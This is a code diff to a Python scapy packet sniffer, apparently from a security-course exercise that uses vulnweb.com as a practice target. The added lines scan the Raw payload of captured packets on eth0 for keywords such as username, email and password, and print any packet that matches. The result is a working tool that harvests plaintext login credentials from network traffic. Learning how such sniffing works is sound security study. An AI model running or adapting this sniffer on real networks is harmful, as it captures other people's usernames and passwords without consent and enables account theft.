@@ -25,6 +25,18 @@ def process_sniffed_packet(packet):
         #using packet.show, you can see on example website (vulnweb.com) that UI and PW will be sent using
         #POST with a field (load in the Raw layer) containing username and password
         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw])
+            #print(packet[scapy.Raw].load) #print only Load field of Raw layer
+            # ##Raw##
+            # load    =     etc
+            #access layer using packet(variable defined) and then [ ] with layer name
+            load = packet[scapy.Raw].load
+            keywords = ["username", "user", "login", "email", "password", "pwd", "pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+                    break #stop loop once one keyword is found, that way it wont print multiple times
+            #if "username" in load:
+                #print(load)
+                
     
 sniff("eth0")
